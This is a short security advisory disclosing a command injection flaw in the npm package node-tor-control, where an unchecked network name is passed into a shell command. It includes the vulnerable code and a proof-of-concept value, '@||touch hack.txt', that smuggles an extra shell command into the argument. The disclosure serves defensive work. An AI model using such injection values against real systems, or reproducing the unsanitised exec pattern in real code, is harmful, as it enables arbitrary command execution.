# Command Injection in node-tor-control
## Basic information
Vulnerability Author: YorkLee(liyue2021@hust.edu.cn)

Vulnerable npm package: node-tor-control

Npm url: https://www.npmjs.com/package/node-tor-control

Github url: https://github.com/alehatsman/node-tor-control

Vulnerable version: <= 0.0.2

Vulnerable file: src/socks/socks-info.js, src/socks/socks-state.js

Taking src/socks/socks-info.js:getSocksProxyInfo as an example:
```js
async function getSocksProxyInfo(network = DEFAULT_NETWORK) {
  try {
    const info = await process.exec(`networksetup -getsocksfirewallproxy "${network}"`);
    return parseSocksProxyInfo(info);
  } catch (e) {
    throw e.stdout;
  }
}
```
The vulnerability is in src/socks/socks-info.js, line 51. network is not checked.
The function setSocksProxyInfo in src/socks/socks-info.js and setSocksProxyState in src/socks/socks-state.js have the same vulnerability.

## Payload
Taking src/socks/socks-info.js:getSocksProxyInfo as an example.

main.js:
```js
const { socks } = require('node-tor-control');
socks.getSocksProxyInfo('@||touch hack.txt')
```
Payload located in network can execute almost all commands.

## Exploit
Environment: Ubuntu2204
```sh
npm i node-tor-control
npm start
```
